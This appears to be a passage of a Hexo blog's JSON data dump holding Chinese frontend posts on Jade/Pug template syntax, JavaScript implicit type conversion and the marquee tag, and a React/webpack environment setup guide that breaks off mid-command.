title=\"jade语法\"></a>jade语法</h2><p><strong>缩进</strong>，<strong>缩进</strong>，<strong>再缩进</strong></p>\n<blockquote>\n<p>就笼统地总结一下吧,详细可以看一下参考链接。</p>\n</blockquote>\n<ol>\n<li>不用尖括号，使用 <strong>缩进</strong></li>\n<li>每个换行的第一个单词会被解释为一个标签(无论HTML有没有这个标签)</li>\n<li>标签的属性名使用括号包起来，并且属性之间用逗号间隔<code>(ATTRNAME1=ATTRVALUE1, ATTRNAME2=ATTRVALUE2)</code>。特别的，<code>id</code>和<code>class</code>可以用像<code>emmet</code>的语法: <code>TAGNAME#IDNAME.CLASSNAME</code>，然后再跟括号包裹其他属性</li>\n<li>使用<code>!{}</code> <code>#{}</code> <code>=</code> <code>!=</code>来渲染后台数据，其中，用<code>!</code>的这一系列可以解释后天数据中的尖括号标签，而其他会把尖括号当成字符串渲染，感觉也是安全考虑</li>\n<li>服务端代码用<code>-</code>开头，比如<code>if</code>判断和<code>for</code>循环等</li>\n<li>可以重用<code>jade</code>块(<code>Mixin</code>声明一个块，然后用<code>+BLOCKNAME()</code>调用)</li>\n<li>模板继承，<code>extends DIRNAME</code></li>\n</ol>\n<hr>\n<p>参考链接</p>\n<ul>\n<li><a href=\"http://cnodejs.org/topic/50e70edfa7e6c6171a1d70fa\" target=\"_blank\" rel=\"external\">Web 模板 Jade、EJS、Handlebars 万行代码解释效率比较，Jade 完败</a></li>\n<li><a href=\"https://www.zhihu.com/question/20355486?sort=created\" target=\"_blank\" rel=\"external\">【知乎】关于nodejs的模板引擎，如何选择 EJS 和 Jade?</a></li>\n<li><a href=\"http://cnodejs.org/topic/5368adc5cf738dd6090060f2\" target=\"_blank\" rel=\"external\"> Jade 模板引擎使用</a></li>\n</ul>\n","site":{"data":{"head":{"Name":"<script> var _hmt = _hmt || []; (function() { var hm = document.createElement('script'); hm.src = 'https://hm.baidu.com/hm.js?348e7e9c1ba7a17f316c54cb6795dec7'; var s = document.getElementsByTagName('script')[0];  s.parentNode.insertBefore(hm, s); })(); </script>"}}},"excerpt":"<blockquote>\n<p>最近发掘了一个个人项目，初上手Node构建web应用。之前大概学了学好久了也都忘了，这次趁着这个项目好好熟悉熟悉，练练手。首先从模板引擎开始吧。</p>\n</blockquote>","more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p><code>jade</code>和<code>pug</code>是一个东西，以前叫<code>jade</code>后来因为商标问题改名<code>pug</code>。</p>\n<h2 id=\"和ejs比较\"><a href=\"#和ejs比较\" class=\"headerlink\" title=\"和ejs比较\"></a>和ejs比较</h2><p>网上有流传过一个万行测试(当时还叫Jade)，让两者和另一个模板引擎，<code>Handlebars</code>解释万行html代码，最后的效率（花费时间）是</p>\n<p>Jade 287ms &gt; ejs 43ms &gt; Handlebars 28ms</p>\n<blockquote>\n<p>Jade 因为采用了类似 zen coding 的语法，比较新奇，但效率极其低下。</p>\n</blockquote>\n<p>但是，<code>pug</code>就其强制缩进而优雅简洁。<code>ejs</code>更传统，于是在大量数据代码结构下页面的结构容易显得混乱。</p>\n<p>另外看了知乎贺老的回答，发觉<code>pug</code>一个超棒的点</p>\n<blockquote>\n<p>换行处理，避免产生额外的空白节点</p>\n</blockquote>\n<p>不知道大家怎么想，反正我老是因为莫名其妙的空白节点困扰，尤其是css样式的时候，其实也知道怎么解决，比如根节点<code>font-size: 0</code>之类的，但是主要是容易和其他样式造成的莫名空隙搞混，不知道到底是哪个原因，就会多一步确认和调试步骤</p>\n<p>贺老还讲了很多，具体看文末的参考链接。</p>\n<p>但是我觉得吧，因为<code>pug</code>的简洁语法，导致会有点上手难度，不像ejs，简直就是个<code>jsp</code>，一眼就看懂了，但是<code>pug</code>要是没专门学习过还真看不太懂，更别说自己写了。</p>\n<h2 id=\"jade语法\"><a href=\"#jade语法\" class=\"headerlink\" title=\"jade语法\"></a>jade语法</h2><p><strong>缩进</strong>，<strong>缩进</strong>，<strong>再缩进</strong></p>\n<blockquote>\n<p>就笼统地总结一下吧,详细可以看一下参考链接。</p>\n</blockquote>\n<ol>\n<li>不用尖括号，使用 <strong>缩进</strong></li>\n<li>每个换行的第一个单词会被解释为一个标签(无论HTML有没有这个标签)</li>\n<li>标签的属性名使用括号包起来，并且属性之间用逗号间隔<code>(ATTRNAME1=ATTRVALUE1, ATTRNAME2=ATTRVALUE2)</code>。特别的，<code>id</code>和<code>class</code>可以用像<code>emmet</code>的语法: <code>TAGNAME#IDNAME.CLASSNAME</code>，然后再跟括号包裹其他属性</li>\n<li>使用<code>!{}</code> <code>#{}</code> <code>=</code> <code>!=</code>来渲染后台数据，其中，用<code>!</code>的这一系列可以解释后天数据中的尖括号标签，而其他会把尖括号当成字符串渲染，感觉也是安全考虑</li>\n<li>服务端代码用<code>-</code>开头，比如<code>if</code>判断和<code>for</code>循环等</li>\n<li>可以重用<code>jade</code>块(<code>Mixin</code>声明一个块，然后用<code>+BLOCKNAME()</code>调用)</li>\n<li>模板继承，<code>extends DIRNAME</code></li>\n</ol>\n<hr>\n<p>参考链接</p>\n<ul>\n<li><a href=\"http://cnodejs.org/topic/50e70edfa7e6c6171a1d70fa\">Web 模板 Jade、EJS、Handlebars 万行代码解释效率比较，Jade 完败</a></li>\n<li><a href=\"https://www.zhihu.com/question/20355486?sort=created\">【知乎】关于nodejs的模板引擎，如何选择 EJS 和 Jade?</a></li>\n<li><a href=\"http://cnodejs.org/topic/5368adc5cf738dd6090060f2\"> Jade 模板引擎使用</a></li>\n</ul>"},{"title":"Js的隐式类型转换","_content":"\n## 起因\n\n##### 腾讯笔试题\n\n顺便吐槽一句......\n\n<!-- more -->\n\n腾讯考的选择题相对其他网易阿里360什么的要更专业前端一些，他们几个都更广泛考一些计算机组成，堆栈，二分什么乱七八糟的计算机基础知识，腾讯选择题全考的网络相关的，但是考的也太网络基础了.....交换机，IPV6相比IPV4的优点，UDP协议头，FTP协议.....咱们安安心心考个HTTP不好么.....我还没懂这么多呢[哭]\n\n##### 好了正式的\n\n起因是在腾讯2017实习生笔试，选择题考了一道关于\n\n\tif(0<100<0) console.log('0<100<0');\n\tif(0<100<(0+4)) console.log('0<100<(0+4)')\n\n## Js的隐式类型转换\n\nJS是弱类型编程语言，这点我一直印象深刻，因为刚学JS的时候发现声明变量不用乱七八糟的去动脑区分 `int`,`long int`,`short int`,`double`等等，只要一个`var`！没错！统统不要，只要一个`var`是不是hin贴心！！！\n\n但是弱类型也带来了一些副作用，比如在代码中存在一些隐式类型转换，可能会让输入输出结果与编程者的期望不太一样。就像这道考题。\n\n考完去chrome控制台验证了一下，输出结果应该是`0<100<(0+4)`，也就是说，`0<100<0+4`在if逻辑中判断为`true`。（神tm的判断......）\n\n这就是隐式类型转换存在的缘故。因为括号内容`(0+4)`的存在，导致了括号中的表达式参与的判断被隐式转换成了number类型，因此，`0<100`正常逻辑判断为`true`后，判断`true<(0+4)`时被转换成了`0<(0+4)`，所以最后被判断为`true`。\n\n以下为控制台验证过程，'//'后为返回结果\n\n\ttrue < 1\t\t\t\t//false\n\ttrue < 2\t\t\t\t//true\n\ttrue - 1\t\t\t\t//0\n\ttrue < (0 + 0)\t\t\t//false\n\ttrue < (0 + 4) \t\t\t//true\n\ttrue === (0 + 1)\t\t//false\n\ttrue == (0 + 1)\t\t\t//true\n\ttrue + 0 === (0 + 1)\t//true\n\n\nP.S.今天做赛码的笔试题的时候学到一个零几年就有但现在基本没人用的跑马灯标签：\n`<marquee>`\n\n其实我感觉功能还挺酷炫的。不仅可以移动文字，也可以移动图片，表格等。\n\n语法：`<marquee direction=\"\" behavior=\"\" scrollamount=\"\" >...</marquee>`(在标记之间添加要进行滚动的内容)\n\n重要属性：\n\n* 滚动方向direction（包括4个值：up、 down、 left和 right）\n* 滚动方式behavior（scroll:循环滚动，默认效果； slide:只滚动一次就停止； alternate:来回交替进行滚动）\n* 滚动速度scrollamount（滚动速度是设置每次滚动时移动的长度，以像素为单位）\n* 滚动延迟scrolldelay（设置滚动的时间间隔，单位是毫秒）\n* 滚动循环loop（默认值是-1，滚动会不断的循环下去）\n* 滚动范围width、height\n* 滚动背景颜色bgcolor\n* 空白空间hspace、vspace\n\n例子跑起来\n\n\t<!DOCTYPE html>\n\t<html>\n\t<head>\n\t\t<title>test</title>\n\t</head>\n\t<body>\n\t\t<marquee direction=\"up\" scroll=\"alternate\" loop=\"-1\" scrollamount=\"10\">这是一个marquee标签，似乎是零几年就存在的一个标签，但是现在好像没听说过</marquee>\n\t\t<marquee direction=\"left\" scroll=\"alternate\" loop=\"-1\" scrollamount=\"10\"><img src=\"https://ss0.baidu.com/73t1bjeh1BF3odCf/it/u=156557612,1695936325&fm=85&s=695818D27C46B819D23D44D50300C062\"></marquee>\n\t</body>\n\t</html>\n\n那么问题来了，这么酷炫的标签为什么现在没人用了呢？\n\n因为他被W3C标准抛弃了！\n\n主要原因可以看一下参考链接。一句话就是：用归用，标准归标准。\n\n> 顺便插个嘴，这玩意儿浏览器支持还挺好的（毕竟那么早的标签了）\n\n参考链接：\n\n* [Marquee为什么不符合WEB标准？](http://www.chinablackhat.com/kf/201410/6610.html)\n* [HTML标签marquee实现滚动效果](http://www.cnblogs.com/zzuIvy/p/marqueeTest_1.html)\n* [一个不陌生的JS效果-marquee的代替实现方法](http://www.cnblogs.com/hustskyking/p/marquee-in-javascript.html)\n","source":"_posts/js隐式类型转换问题.md","raw":"---\n\ntitle: Js的隐式类型转换\ntags: ['js', '数据类型']\n\n---\n\n## 起因\n\n##### 腾讯笔试题\n\n顺便吐槽一句......\n\n<!-- more -->\n\n腾讯考的选择题相对其他网易阿里360什么的要更专业前端一些，他们几个都更广泛考一些计算机组成，堆栈，二分什么乱七八糟的计算机基础知识，腾讯选择题全考的网络相关的，但是考的也太网络基础了.....交换机，IPV6相比IPV4的优点，UDP协议头，FTP协议.....咱们安安心心考个HTTP不好么.....我还没懂这么多呢[哭]\n\n##### 好了正式的\n\n起因是在腾讯2017实习生笔试，选择题考了一道关于\n\n\tif(0<100<0) console.log('0<100<0');\n\tif(0<100<(0+4)) console.log('0<100<(0+4)')\n\n## Js的隐式类型转换\n\nJS是弱类型编程语言，这点我一直印象深刻，因为刚学JS的时候发现声明变量不用乱七八糟的去动脑区分 `int`,`long int`,`short int`,`double`等等，只要一个`var`！没错！统统不要，只要一个`var`是不是hin贴心！！！\n\n但是弱类型也带来了一些副作用，比如在代码中存在一些隐式类型转换，可能会让输入输出结果与编程者的期望不太一样。就像这道考题。\n\n考完去chrome控制台验证了一下，输出结果应该是`0<100<(0+4)`，也就是说，`0<100<0+4`在if逻辑中判断为`true`。（神tm的判断......）\n\n这就是隐式类型转换存在的缘故。因为括号内容`(0+4)`的存在，导致了括号中的表达式参与的判断被隐式转换成了number类型，因此，`0<100`正常逻辑判断为`true`后，判断`true<(0+4)`时被转换成了`0<(0+4)`，所以最后被判断为`true`。\n\n以下为控制台验证过程，'//'后为返回结果\n\n\ttrue < 1\t\t\t\t//false\n\ttrue < 2\t\t\t\t//true\n\ttrue - 1\t\t\t\t//0\n\ttrue < (0 + 0)\t\t\t//false\n\ttrue < (0 + 4) \t\t\t//true\n\ttrue === (0 + 1)\t\t//false\n\ttrue == (0 + 1)\t\t\t//true\n\ttrue + 0 === (0 + 1)\t//true\n\n\nP.S.今天做赛码的笔试题的时候学到一个零几年就有但现在基本没人用的跑马灯标签：\n`<marquee>`\n\n其实我感觉功能还挺酷炫的。不仅可以移动文字，也可以移动图片，表格等。\n\n语法：`<marquee direction=\"\" behavior=\"\" scrollamount=\"\" >...</marquee>`(在标记之间添加要进行滚动的内容)\n\n重要属性：\n\n* 滚动方向direction（包括4个值：up、 down、 left和 right）\n* 滚动方式behavior（scroll:循环滚动，默认效果； slide:只滚动一次就停止； alternate:来回交替进行滚动）\n* 滚动速度scrollamount（滚动速度是设置每次滚动时移动的长度，以像素为单位）\n* 滚动延迟scrolldelay（设置滚动的时间间隔，单位是毫秒）\n* 滚动循环loop（默认值是-1，滚动会不断的循环下去）\n* 滚动范围width、height\n* 滚动背景颜色bgcolor\n* 空白空间hspace、vspace\n\n例子跑起来\n\n\t<!DOCTYPE html>\n\t<html>\n\t<head>\n\t\t<title>test</title>\n\t</head>\n\t<body>\n\t\t<marquee direction=\"up\" scroll=\"alternate\" loop=\"-1\" scrollamount=\"10\">这是一个marquee标签，似乎是零几年就存在的一个标签，但是现在好像没听说过</marquee>\n\t\t<marquee direction=\"left\" scroll=\"alternate\" loop=\"-1\" scrollamount=\"10\"><img src=\"https://ss0.baidu.com/73t1bjeh1BF3odCf/it/u=156557612,1695936325&fm=85&s=695818D27C46B819D23D44D50300C062\"></marquee>\n\t</body>\n\t</html>\n\n那么问题来了，这么酷炫的标签为什么现在没人用了呢？\n\n因为他被W3C标准抛弃了！\n\n主要原因可以看一下参考链接。一句话就是：用归用，标准归标准。\n\n> 顺便插个嘴，这玩意儿浏览器支持还挺好的（毕竟那么早的标签了）\n\n参考链接：\n\n* [Marquee为什么不符合WEB标准？](http://www.chinablackhat.com/kf/201410/6610.html)\n* [HTML标签marquee实现滚动效果](http://www.cnblogs.com/zzuIvy/p/marqueeTest_1.html)\n* [一个不陌生的JS效果-marquee的代替实现方法](http://www.cnblogs.com/hustskyking/p/marquee-in-javascript.html)\n","slug":"js隐式类型转换问题","published":1,"date":"2017-04-04T07:08:59.293Z","updated":"2017-04-08T16:23:40.953Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj9ft3s3u0008l8slluf9hatq","content":"<h2 id=\"起因\"><a href=\"#起因\" class=\"headerlink\" title=\"起因\"></a>起因</h2><h5 id=\"腾讯笔试题\"><a href=\"#腾讯笔试题\" class=\"headerlink\" title=\"腾讯笔试题\"></a>腾讯笔试题</h5><p>顺便吐槽一句……</p>\n<a id=\"more\"></a>\n<p>腾讯考的选择题相对其他网易阿里360什么的要更专业前端一些，他们几个都更广泛考一些计算机组成，堆栈，二分什么乱七八糟的计算机基础知识，腾讯选择题全考的网络相关的，但是考的也太网络基础了…..交换机，IPV6相比IPV4的优点，UDP协议头，FTP协议…..咱们安安心心考个HTTP不好么…..我还没懂这么多呢[哭]</p>\n<h5 id=\"好了正式的\"><a href=\"#好了正式的\" class=\"headerlink\" title=\"好了正式的\"></a>好了正式的</h5><p>起因是在腾讯2017实习生笔试，选择题考了一道关于</p>\n<pre><code>if(0&lt;100&lt;0) console.log(&apos;0&lt;100&lt;0&apos;);\nif(0&lt;100&lt;(0+4)) console.log(&apos;0&lt;100&lt;(0+4)&apos;)\n</code></pre><h2 id=\"Js的隐式类型转换\"><a href=\"#Js的隐式类型转换\" class=\"headerlink\" title=\"Js的隐式类型转换\"></a>Js的隐式类型转换</h2><p>JS是弱类型编程语言，这点我一直印象深刻，因为刚学JS的时候发现声明变量不用乱七八糟的去动脑区分 <code>int</code>,<code>long int</code>,<code>short int</code>,<code>double</code>等等，只要一个<code>var</code>！没错！统统不要，只要一个<code>var</code>是不是hin贴心！！！</p>\n<p>但是弱类型也带来了一些副作用，比如在代码中存在一些隐式类型转换，可能会让输入输出结果与编程者的期望不太一样。就像这道考题。</p>\n<p>考完去chrome控制台验证了一下，输出结果应该是<code>0&lt;100&lt;(0+4)</code>，也就是说，<code>0&lt;100&lt;0+4</code>在if逻辑中判断为<code>true</code>。（神tm的判断……）</p>\n<p>这就是隐式类型转换存在的缘故。因为括号内容<code>(0+4)</code>的存在，导致了括号中的表达式参与的判断被隐式转换成了number类型，因此，<code>0&lt;100</code>正常逻辑判断为<code>true</code>后，判断<code>true&lt;(0+4)</code>时被转换成了<code>0&lt;(0+4)</code>，所以最后被判断为<code>true</code>。</p>\n<p>以下为控制台验证过程，’//‘后为返回结果</p>\n<pre><code>true &lt; 1                //false\ntrue &lt; 2                //true\ntrue - 1                //0\ntrue &lt; (0 + 0)            //false\ntrue &lt; (0 + 4)             //true\ntrue === (0 + 1)        //false\ntrue == (0 + 1)            //true\ntrue + 0 === (0 + 1)    //true\n</code></pre><p>P.S.今天做赛码的笔试题的时候学到一个零几年就有但现在基本没人用的跑马灯标签：<br><code>&lt;marquee&gt;</code></p>\n<p>其实我感觉功能还挺酷炫的。不仅可以移动文字，也可以移动图片，表格等。</p>\n<p>语法：<code>&lt;marquee direction=&quot;&quot; behavior=&quot;&quot; scrollamount=&quot;&quot; &gt;...&lt;/marquee&gt;</code>(在标记之间添加要进行滚动的内容)</p>\n<p>重要属性：</p>\n<ul>\n<li>滚动方向direction（包括4个值：up、 down、 left和 right）</li>\n<li>滚动方式behavior（scroll:循环滚动，默认效果； slide:只滚动一次就停止； alternate:来回交替进行滚动）</li>\n<li>滚动速度scrollamount（滚动速度是设置每次滚动时移动的长度，以像素为单位）</li>\n<li>滚动延迟scrolldelay（设置滚动的时间间隔，单位是毫秒）</li>\n<li>滚动循环loop（默认值是-1，滚动会不断的循环下去）</li>\n<li>滚动范围width、height</li>\n<li>滚动背景颜色bgcolor</li>\n<li>空白空间hspace、vspace</li>\n</ul>\n<p>例子跑起来</p>\n<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;test&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;marquee direction=&quot;up&quot; scroll=&quot;alternate&quot; loop=&quot;-1&quot; scrollamount=&quot;10&quot;&gt;这是一个marquee标签，似乎是零几年就存在的一个标签，但是现在好像没听说过&lt;/marquee&gt;\n    &lt;marquee direction=&quot;left&quot; scroll=&quot;alternate&quot; loop=&quot;-1&quot; scrollamount=&quot;10&quot;&gt;&lt;img src=&quot;https://ss0.baidu.com/73t1bjeh1BF3odCf/it/u=156557612,1695936325&amp;fm=85&amp;s=695818D27C46B819D23D44D50300C062&quot;&gt;&lt;/marquee&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre><p>那么问题来了，这么酷炫的标签为什么现在没人用了呢？</p>\n<p>因为他被W3C标准抛弃了！</p>\n<p>主要原因可以看一下参考链接。一句话就是：用归用，标准归标准。</p>\n<blockquote>\n<p>顺便插个嘴，这玩意儿浏览器支持还挺好的（毕竟那么早的标签了）</p>\n</blockquote>\n<p>参考链接：</p>\n<ul>\n<li><a href=\"http://www.chinablackhat.com/kf/201410/6610.html\" target=\"_blank\" rel=\"external\">Marquee为什么不符合WEB标准？</a></li>\n<li><a href=\"http://www.cnblogs.com/zzuIvy/p/marqueeTest_1.html\" target=\"_blank\" rel=\"external\">HTML标签marquee实现滚动效果</a></li>\n<li><a href=\"http://www.cnblogs.com/hustskyking/p/marquee-in-javascript.html\" target=\"_blank\" rel=\"external\">一个不陌生的JS效果-marquee的代替实现方法</a></li>\n</ul>\n","site":{"data":{"head":{"Name":"<script> var _hmt = _hmt || []; (function() { var hm = document.createElement('script'); hm.src = 'https://hm.baidu.com/hm.js?348e7e9c1ba7a17f316c54cb6795dec7'; var s = document.getElementsByTagName('script')[0];  s.parentNode.insertBefore(hm, s); })(); </script>"}}},"excerpt":"<h2 id=\"起因\"><a href=\"#起因\" class=\"headerlink\" title=\"起因\"></a>起因</h2><h5 id=\"腾讯笔试题\"><a href=\"#腾讯笔试题\" class=\"headerlink\" title=\"腾讯笔试题\"></a>腾讯笔试题</h5><p>顺便吐槽一句……</p>","more":"<p>腾讯考的选择题相对其他网易阿里360什么的要更专业前端一些，他们几个都更广泛考一些计算机组成，堆栈，二分什么乱七八糟的计算机基础知识，腾讯选择题全考的网络相关的，但是考的也太网络基础了…..交换机，IPV6相比IPV4的优点，UDP协议头，FTP协议…..咱们安安心心考个HTTP不好么…..我还没懂这么多呢[哭]</p>\n<h5 id=\"好了正式的\"><a href=\"#好了正式的\" class=\"headerlink\" title=\"好了正式的\"></a>好了正式的</h5><p>起因是在腾讯2017实习生笔试，选择题考了一道关于</p>\n<pre><code>if(0&lt;100&lt;0) console.log(&apos;0&lt;100&lt;0&apos;);\nif(0&lt;100&lt;(0+4)) console.log(&apos;0&lt;100&lt;(0+4)&apos;)\n</code></pre><h2 id=\"Js的隐式类型转换\"><a href=\"#Js的隐式类型转换\" class=\"headerlink\" title=\"Js的隐式类型转换\"></a>Js的隐式类型转换</h2><p>JS是弱类型编程语言，这点我一直印象深刻，因为刚学JS的时候发现声明变量不用乱七八糟的去动脑区分 <code>int</code>,<code>long int</code>,<code>short int</code>,<code>double</code>等等，只要一个<code>var</code>！没错！统统不要，只要一个<code>var</code>是不是hin贴心！！！</p>\n<p>但是弱类型也带来了一些副作用，比如在代码中存在一些隐式类型转换，可能会让输入输出结果与编程者的期望不太一样。就像这道考题。</p>\n<p>考完去chrome控制台验证了一下，输出结果应该是<code>0&lt;100&lt;(0+4)</code>，也就是说，<code>0&lt;100&lt;0+4</code>在if逻辑中判断为<code>true</code>。（神tm的判断……）</p>\n<p>这就是隐式类型转换存在的缘故。因为括号内容<code>(0+4)</code>的存在，导致了括号中的表达式参与的判断被隐式转换成了number类型，因此，<code>0&lt;100</code>正常逻辑判断为<code>true</code>后，判断<code>true&lt;(0+4)</code>时被转换成了<code>0&lt;(0+4)</code>，所以最后被判断为<code>true</code>。</p>\n<p>以下为控制台验证过程，’//‘后为返回结果</p>\n<pre><code>true &lt; 1                //false\ntrue &lt; 2                //true\ntrue - 1                //0\ntrue &lt; (0 + 0)            //false\ntrue &lt; (0 + 4)             //true\ntrue === (0 + 1)        //false\ntrue == (0 + 1)            //true\ntrue + 0 === (0 + 1)    //true\n</code></pre><p>P.S.今天做赛码的笔试题的时候学到一个零几年就有但现在基本没人用的跑马灯标签：<br><code>&lt;marquee&gt;</code></p>\n<p>其实我感觉功能还挺酷炫的。不仅可以移动文字，也可以移动图片，表格等。</p>\n<p>语法：<code>&lt;marquee direction=&quot;&quot; behavior=&quot;&quot; scrollamount=&quot;&quot; &gt;...&lt;/marquee&gt;</code>(在标记之间添加要进行滚动的内容)</p>\n<p>重要属性：</p>\n<ul>\n<li>滚动方向direction（包括4个值：up、 down、 left和 right）</li>\n<li>滚动方式behavior（scroll:循环滚动，默认效果； slide:只滚动一次就停止； alternate:来回交替进行滚动）</li>\n<li>滚动速度scrollamount（滚动速度是设置每次滚动时移动的长度，以像素为单位）</li>\n<li>滚动延迟scrolldelay（设置滚动的时间间隔，单位是毫秒）</li>\n<li>滚动循环loop（默认值是-1，滚动会不断的循环下去）</li>\n<li>滚动范围width、height</li>\n<li>滚动背景颜色bgcolor</li>\n<li>空白空间hspace、vspace</li>\n</ul>\n<p>例子跑起来</p>\n<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;test&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;marquee direction=&quot;up&quot; scroll=&quot;alternate&quot; loop=&quot;-1&quot; scrollamount=&quot;10&quot;&gt;这是一个marquee标签，似乎是零几年就存在的一个标签，但是现在好像没听说过&lt;/marquee&gt;\n    &lt;marquee direction=&quot;left&quot; scroll=&quot;alternate&quot; loop=&quot;-1&quot; scrollamount=&quot;10&quot;&gt;&lt;img src=&quot;https://ss0.baidu.com/73t1bjeh1BF3odCf/it/u=156557612,1695936325&amp;fm=85&amp;s=695818D27C46B819D23D44D50300C062&quot;&gt;&lt;/marquee&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre><p>那么问题来了，这么酷炫的标签为什么现在没人用了呢？</p>\n<p>因为他被W3C标准抛弃了！</p>\n<p>主要原因可以看一下参考链接。一句话就是：用归用，标准归标准。</p>\n<blockquote>\n<p>顺便插个嘴，这玩意儿浏览器支持还挺好的（毕竟那么早的标签了）</p>\n</blockquote>\n<p>参考链接：</p>\n<ul>\n<li><a href=\"http://www.chinablackhat.com/kf/201410/6610.html\">Marquee为什么不符合WEB标准？</a></li>\n<li><a href=\"http://www.cnblogs.com/zzuIvy/p/marqueeTest_1.html\">HTML标签marquee实现滚动效果</a></li>\n<li><a href=\"http://www.cnblogs.com/hustskyking/p/marquee-in-javascript.html\">一个不陌生的JS效果-marquee的代替实现方法</a></li>\n</ul>"},{"title":"新时代使用react框架的环境搭建","_content":"\n> 作为一名2016年成长起来的前端，怎么能不会react，不会babel，不会es6，不会webpack.....呢\n\n<!-- more -->\n\n## 安装与配置\n\n创建一个目录，就不用说了。这里先取名为`root`。\n\n### 创建项目配置文件`package.json`\n\n\tnpm init\n\n填写相关问题，即可在`root`根目录创建`package.json`文件。\n\n> 注意，其中的package name不能与`npm`的包同名，否则`npm install`的时候会出错，安装不上。另外，创建该配置文件后，后续`npm install`的包都会在安装完成后自动加入`package.json`的字段中。\n\n这里给个目录预告\n\n* /app\n\t* main.js\n\t* component.js\n* /public\n\t* bundle.js\n\t* index.html\n* /node_modules\n\t* ...\n* package.json\n* webpack.config.js\n\n### 安装与配置`webpack`\n\n#### 安装\n\n\tnpm install --save-dev webpack\n\n#### 配置\n\n在根目录`root`创建`webpack.config.js`。\n\n具体配置参数请搜索相关信息，不详细介绍，这里给个例子\n\n\tvar path = require('path');\n\n\tmodule.exports = {\n        entry: path.resolve(__dirname, 'app/main.js'),\n\t    output: {\n\t        path: path.resolve(__dirname, 'public'),\n\t        filename: 'bundle.js',\n\t    },\n\t    module: {\n\t\t    loaders: [\n\t\t      \t{\n\t\t\t\t    test: /\\.js$/, \n\t\t\t\t    exclude: /node_modules/, \n\t\t\t\t    loader: 'babel-loader'\n\t\t\t\t}\n\t\t\t]\n\t    },\n\t};\n\n### 安装与配置`webpack-dev-server`\n\n这是一个能够提供一个可选的本地开发服务器（基于Node创建），用来监听文件改变并自动编译的包\n\n#### 安装\n\n\tnpm install --save-dev webpack-dev-server\n\n#### 配置\n\n在`webpack.config.js`中添加\n\n\tmodule.exports = {\n\t    ......\n\t    devServer: {\n\t    \tcontentBase: \"public\",\n\t\t    historyApiFallback: true,\n\t\t    inline: true,\n\t\t    hot: true\n\t    },\n\t    plugins: [\n\t    \tnew webpack.HotModuleReplacementPlugin()\n\t    ]\n\t};\n\n### 安装react,react-dom\n\n\tnpm install --save-dev react react-dom\n\n> 多个包之间用空格间隔开\n\n### 安装与配置eslint\n\n#### 安装\n\n\tnpm install eslint -g\n\n> 用了全局安装，我在使用时使用本地安装使用时在根目录找不到命令`eslint`不知道为什么，最后一想，反正代码检查全都要用，就全局安装了。后续有时间会研究一下这个问题。\n\n#### 配置\n\n使用`eslint`自带的命令配置即可：\n\n\teslint -init\n\n和`npm init`的形式一样，也是问答式的自动创建。更为方便的是也可以通过这个命令直接使用比如airbnb公司的配置（他们的配置几乎是所有`eslint`使用者的强推，这也看出来大家都用的mac[捂脸],windows下使用`eslint-config-airbnb`每行都错，因为windows使用的换行符是`crlf`而mac是`lf`，他们的配置要求所有换行是`lf`）\n\n## 目录树\n\n安装了一些必要的包之后，目前根目录`root`下的文件结构应该是这样的，其中有三个文件是手动创建的：\n\n* `main.js`：`webpack`打包整个项目时作为唯一入口，引用项目的所有依赖\n* `index.html`：引入`main.js`，作为承载整个项目的页面\n* `component.js`：具体的业务相关逻辑代码存放处，可再细分\n\n而`bundle.js`会在后续中使用`webpack`自动创建。\n\n* /app\n\t* main.js\n\t* component.js\n* /public\n\t* bundle.js\n\t* index.html\n* /node_modules\n\t* ...\n* package.json\n* webpack.config.js\n\n## 使用\n\n### `index.html`，`component.js`和`main.js`的例子\n\n**app/component.js**\n\n\t'use strict';\n\n\tmodule.exports = function () {\n\t    var element = document.createElement('h1');\n\n\t    element.innerHTML = 'Hello world';\n\n\t    return element;\n\t};\n\n**app/main.js**\n\n\t'use strict';\n\tvar component = require('./component.js');\n\n\tdocument.body.appendChild(component());\n\n**index.html**\n\n\t<!DOCTYPE html>\n\t<html>\n\t  <head>\n\t    <meta charset=\"UTF-8\"/>\n\t  </head>\n\t  <body>\n\t    <script src=\"bundle.js\"></script>\n\t  </body>\n\t</html>\n\n好了，最后在根目录运行 \n\n\twebpack\n\n就自动编译出了`bundle.js`。\n\n另外，如果使用自动编译：\n\n\twebpack-dev-server --devtool eval --progress --colors\n\n参数说明：\n\n* webpack-dev-server - 在 localhost:8080 建立一个 Web 服务器\n* --devtool eval - 为代码创建源地址。当有任何报错的时候可以让你更加精确地定位到文件和行号\n* --hot - 需要在`webpack.config.js`中引用一个`plugins`插件`new webpack.HotModuleReplacementPlugin()`才生效\n* --progress - 显示合并代码进度\n* --colors - 在命令行中显示颜色\n* --content-base public - 指向设置的输出目录\n\n附：\n\n|devtool选项\t|配置结果|\n|:--------------|:--------|\n|source-map\t|在一个单独的文件中产生一个完整且功能完全的文件。这个文件具有最好的source map，但是它会减慢打包文件的构建速度；|\n|cheap-module-source-map\t|在一个单独的文件中生成一个不带列映射的map，不带列映射提高项目构建速度，但是也使得浏览器开发者工具只能对应到具体的行，不能对应到具体的列（符号），会对调试造成不便；|\n|eval-source-map\t|使用eval打包源文件模块，在同一个文件中生成干净的完整的source map。这个选项可以在不影响构建速度的前提下生成完整的sourcemap，但是对打包后输出的JS文件的执行具有性能和安全的隐患。不过在开发阶段这是一个非常好的选项，但是在生产阶段一定不要用这个选项；|\n|cheap-module-eval-source-map\t|这是在打包文件时最快的生成source map的方法，生成的Source Map 会和打包后的JavaScript文件同行显示，没有列映射，和eval-source-map选项具有相似的缺点|\n\n\n### 命令行规范\n\n随着工程的复杂化，我们会需要越来越多的命令去执行，规范的行为是，统一放到`package.json`的`scripts`字段中，统一管理。\n\n像上面的 \n\n`webpack-dev-server --devtool eval --progress --colors`\n\n命令，可以这样配置`scripts`字段(`key`名可以任意起，这里叫`build`，`dev`)\n\n\t\"scripts\": {\n\t\t\"build\": \"webpack\",\n    \t\"dev\": \"webpack-dev-server --devtool eval --progress --colors\"\n\t}\n\n这样每次使用\n\n\tnpm run 